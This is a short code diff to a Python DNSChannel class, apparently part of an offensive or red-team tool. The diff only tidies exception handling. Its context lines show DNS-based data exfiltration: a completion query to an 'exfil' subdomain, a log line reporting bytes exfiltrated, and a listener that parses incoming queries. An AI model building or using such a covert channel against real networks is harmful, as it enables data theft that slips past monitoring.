@@ -330,8 +330,8 @@ class DNSChannel:
         completion = f"done.{data_hash}.exfil.{self.domain}"
         try:
             _dns_query_a(completion)
-        except Exception:
-            pass
+        except Exception as _exc:
+            logging.debug(f"Suppressed in dns.py: {_exc}")
 
         logger.info("Exfiltration complete: %d chunks, %d bytes, hash=%s",
                      queries_sent, len(data), data_hash)
@@ -424,7 +424,7 @@ class DNSChannel:
 
                 try:
                     query_name, qtype = _parse_dns_query(data)
-                except Exception:
+                except Exception as e:
                     continue
 
                 if not query_name.endswith(self.domain):
